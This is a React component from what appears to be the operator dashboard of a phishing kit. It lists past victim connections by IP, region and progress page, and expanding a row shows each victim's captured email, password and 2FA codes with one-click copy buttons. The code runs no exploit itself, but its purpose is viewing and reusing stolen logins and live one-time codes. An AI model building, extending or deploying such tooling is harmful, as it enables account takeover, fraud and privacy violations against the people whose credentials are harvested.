"use client";

import { useMemo, useState } from "react";
import { Badge } from "@/components/reui/badge";
import {
  DataGrid,
  DataGridContainer,
} from "@/components/reui/data-grid/data-grid";
import { DataGridPagination } from "@/components/reui/data-grid/data-grid-pagination";
import { DataGridTable } from "@/components/reui/data-grid/data-grid-table";
import {
  getCoreRowModel,
  getFilteredRowModel,
  getPaginationRowModel,
  getSortedRowModel,
  useReactTable,
} from "@tanstack/react-table";
import { ScrollArea, ScrollBar } from "@/components/ui/scroll-area";
import { Button } from "@/components/ui/button";
import { ChevronDownIcon, ChevronUpIcon, Inbox, Eye, EyeOff, Smartphone } from "lucide-react";

function getFlagSrc(countryCode) {
  if (!countryCode || String(countryCode).length !== 2) return null;
  return `https://flagsapi.com/${String(countryCode).toUpperCase()}/shiny/64.png`;
}

function refIdFromSocketId(socketId) {
  if (!socketId) return "—";
  return Array.from(socketId).reduce((acc, char) => acc + char.charCodeAt(0) * 100, 0).toString().slice(0, 6);
}

function CopyableValue({ value, label, copiedId, onCopy, id, className = "" }) {
  const isCopied = copiedId === id;
  return (
    <button
      type="button"
      onClick={() => onCopy(value, id)}
      className={`inline-flex items-center gap-1.5 text-left rounded px-1 -mx-1 hover:bg-muted/50 transition-colors cursor-pointer group ${className}`}
      title="Click to copy"
    >
      <span className="text-muted-foreground">{label}</span>
      <span className="font-mono text-foreground">{value}</span>
      {isCopied && <span className="text-xs text-green-500">Copied!</span>}
    </button>
  );
}

function HistoryRowExpandedContent({ row }) {
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [copiedId, setCopiedId] = useState(null);
  const d = row?.original ?? {};
  const geo = d.geoData ?? {};
  const login = d.loginData && typeof d.loginData === "object" ? d.loginData : {};
  const refId = refIdFromSocketId(d.socketId);
  const flagSrc = getFlagSrc(geo.country);
  const disconnectedStr = d.disconnectedAt
    ? new Date(d.disconnectedAt).toLocaleString()
    : "N/A";
  const isCompleted = d.currentPage === "AURPage";
  const twoFaCodes = Array.isArray(login.twoFactorCodes) ? login.twoFactorCodes : (login.twoFactorCode ? [login.twoFactorCode] : []);
  const hasEmail = login.email != null && String(login.email).trim() !== "";
  const hasPassword = login.password != null && String(login.password).trim() !== "";
  const hasCredentials = hasEmail || hasPassword;
  const has2FA = twoFaCodes.length > 0;

  const handleCopy = (text, id) => {
    if (text == null || String(text).trim() === "") return;
    navigator.clipboard?.writeText(String(text)).then(() => {
      setCopiedId(id);
      setTimeout(() => setCopiedId(null), 2000);
    });
  };

  return (
    <div className="text-muted-foreground ms-12 py-3 text-sm space-y-3">
      <div className="grid grid-cols-2 gap-x-6 gap-y-1 sm:grid-cols-3">
        <div><span className="text-foreground font-medium">Reference ID</span>: <span className="font-mono">{refId}</span></div>
        <div><span className="text-foreground font-medium">IP</span>: <span className="font-mono">{geo.ip || "N/A"}</span></div>
        <div><span className="text-foreground font-medium">Region</span>: <span className="inline-flex items-center gap-1">{flagSrc && <img src={flagSrc} alt="" className="size-4 rounded object-cover" />}{geo.region || geo.country || "N/A"}</span></div>
        <div><span className="text-foreground font-medium">Disconnected</span>: {disconnectedStr}</div>
        <div><span className="text-foreground font-medium">Status</span>: <span className={`inline-flex items-center rounded-full px-2 py-1 text-xs font-medium ${isCompleted ? "bg-green-500/10 text-green-700" : "bg-gray-500/10 text-gray-700"}`}>{isCompleted ? "Completed" : "Pending"}</span></div>
        <div><span className="text-foreground font-medium">Page</span>: {d.currentPage || "—"}</div>
      </div>
      {hasCredentials ? (
        <div className="space-y-1">
          <span className="text-foreground font-medium block">Credentials</span>
          <div className="flex flex-wrap gap-3 items-center">
            {hasEmail && (
              <div className="inline-flex items-center gap-1.5">
                <Inbox className="size-4 text-muted-foreground shrink-0" aria-hidden />
                <CopyableValue value={login.email} label="Email:" copiedId={copiedId} onCopy={handleCopy} id="email" />
              </div>
            )}
            {hasPassword && (
              <div className="inline-flex items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => setPasswordVisible((v) => !v)}
                  className="p-0.5 rounded text-muted-foreground hover:text-foreground hover:bg-muted/50"
                  aria-label={passwordVisible ? "Hide password" : "Show password"}
                >
                  {passwordVisible ? <EyeOff className="size-4" /> : <Eye className="size-4" />}
                </button>
                <button
                  type="button"
                  onClick={() => handleCopy(login.password, "password")}
                  className="inline-flex items-center gap-1.5 text-left rounded px-1 -mx-1 hover:bg-muted/50 transition-colors cursor-pointer group"
                  title="Click to copy"
                >
                  <span className="text-muted-foreground">Password:</span>
                  <span
                    className={`font-mono text-foreground select-none transition-[filter] duration-150 ${!passwordVisible ? "blur-[6px] hover:blur-[4px]" : ""}`}
                  >
                    {passwordVisible ? login.password : "••••••••"}
                  </span>
                  {copiedId === "password" && <span className="text-xs text-green-500">Copied!</span>}
                </button>
              </div>
            )}
          </div>
        </div>
      ) : null}
      {has2FA ? (
        <div className="space-y-1">
          <div className="flex flex-wrap items-center gap-2">
            <span className="text-foreground font-medium inline-flex items-center gap-1.5">
              <Smartphone className="size-4 text-muted-foreground" aria-hidden />
              2FA {twoFaCodes.length > 1 ? "codes" : "code"}
            </span>
            {twoFaCodes.map((code, i) => (
              <button
                key={i}
                type="button"
                onClick={() => handleCopy(String(code), `2fa-${i}`)}
                className="font-mono text-foreground bg-muted/50 px-2 py-1 rounded text-xs hover:bg-muted transition-colors cursor-pointer inline-flex items-center gap-1.5"
                title="Click to copy"
              >
                {String(code)}
                {copiedId === `2fa-${i}` && <span className="text-xs text-green-500">Copied!</span>}
              </button>
            ))}
          </div>
        </div>
      ) : null}
      {!hasCredentials && !has2FA ? (
        <p className="text-muted-foreground text-xs">No credentials or 2FA captured for this connection.</p>
      ) : null}
    </div>
  );
}

export function HistoryDataGrid({ data = [], loading = false }) {
  const [pagination, setPagination] = useState({
    pageIndex: 0,
    pageSize: 10,
  });
  const [sorting, setSorting] = useState([
    { id: "disconnectedAt", desc: true },
  ]);

  const rows = useMemo(() => {
    return (data || []).map((entry, i) => ({
      ...entry,
      id: entry._id?.toString() || entry.socketId || `row-${i}`,
    }));
  }, [data]);

  const columns = useMemo(
    () => [
      {
        id: "expand",
        header: () => null,
        cell: ({ row }) =>
          row.getCanExpand() ? (
            <Button
              className="size-6 text-muted-foreground hover:bg-transparent"
              onClick={row.getToggleExpandedHandler()}
              variant="ghost"
              size="icon-xs"
            >
              {row.getIsExpanded() ? (
                <ChevronUpIcon aria-hidden="true" className="size-4" />
              ) : (
                <ChevronDownIcon aria-hidden="true" className="size-4" />
              )}
            </Button>
          ) : null,
        size: 12,
        meta: {
          expandedContent: (rowOriginal) => (
            <HistoryRowExpandedContent row={{ original: rowOriginal }} />
          ),
        },
      },
      {
        accessorKey: "socketId",
        id: "refId",
        header: "Reference ID",
        cell: ({ row }) => (
          <span className="font-mono text-foreground">
            {refIdFromSocketId(row.original.socketId)}
          </span>
        ),
        size: 100,
      },
      {
        accessorKey: "geoData.ip",
        id: "ip",
        header: "IP",
        cell: ({ row }) => (
          <span className="font-mono text-foreground">
            {row.original.geoData?.ip || "N/A"}
          </span>
        ),
        size: 140,
      },
      {
        id: "region",
        header: "Region",
        cell: ({ row }) => {
          const country = row.original.geoData?.country;
          const src = getFlagSrc(country);
          const region = row.original.geoData?.region || row.original.geoData?.country || "N/A";
          return (
            <div className="flex items-center gap-2">
              {src && (
                <img
                  src={src}
                  alt=""
                  className="size-5 rounded object-cover"
                />
              )}
              <span className="text-foreground">{region}</span>
            </div>
          );
        },
        size: 160,
      },
      {
        accessorKey: "disconnectedAt",
        id: "disconnectedAt",
        header: "Disconnected",
        cell: ({ row }) => (
          <span className="text-foreground">
            {row.original.disconnectedAt
              ? new Date(row.original.disconnectedAt).toLocaleString()
              : "N/A"}
          </span>
        ),
        size: 180,
        enableSorting: true,
      },
      {
        id: "status",
        header: "Status",
        cell: ({ row }) => {
          const isAUR = row.original.currentPage === "AURPage";
          const status = isAUR ? "Completed" : "Pending";
          const statusColor = isAUR ? "bg-green-500/10 text-green-700" : "bg-gray-500/10 text-gray-700";
          return (
            <span
              className={`inline-flex items-center rounded-full px-2 py-1 text-xs font-medium ${statusColor}`}
            >
              {status}
            </span>
          );
        },
        size: 100,
      },
    ],
    []
  );

  const table = useReactTable({
    columns,
    data: rows,
    pageCount: Math.ceil((rows?.length || 0) / pagination.pageSize),
    getRowId: (row) => row.id,
    getRowCanExpand: () => true,
    state: {
      pagination,
      sorting,
    },
    onPaginationChange: setPagination,
    onSortingChange: setSorting,
    getCoreRowModel: getCoreRowModel(),
    getFilteredRowModel: getFilteredRowModel(),
    getPaginationRowModel: getPaginationRowModel(),
    getSortedRowModel: getSortedRowModel(),
  });

  if (loading) {
    return <p className="text-muted-foreground">Loading history...</p>;
  }

  return (
    <DataGrid
      table={table}
      recordCount={rows?.length || 0}
      tableLayout={{ headerBackground: false }}
    >
      <div className="w-full space-y-2.5">
        <DataGridContainer border={false}>
          <ScrollArea>
            <DataGridTable />
            <ScrollBar orientation="horizontal" />
          </ScrollArea>
        </DataGridContainer>
        <DataGridPagination />
      </div>
    </DataGrid>
  );
}
